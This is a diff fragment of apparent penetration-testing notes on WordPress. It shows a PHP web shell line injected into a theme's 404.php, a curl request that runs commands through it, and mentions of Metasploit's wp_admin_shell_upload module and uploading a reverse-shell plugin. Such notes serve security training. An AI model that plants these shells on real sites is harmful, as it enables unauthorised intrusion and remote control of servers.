@@ -220,4 +220,4 @@ system($_GET['cmd']);
 curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 - If we have access to an account that has sufficient rights to create files on the webserver, we could use the `wp_admin_shell_upload` module from `Metasploit` to obtain a reverse shell on the target
-Without **administrative access** to WordPress, 
+Without **administrative access** to WordPress, it may be possible to `upload .php` files as a `plugin`. Create a `php reverse shell` in a file called `shell.php`. 
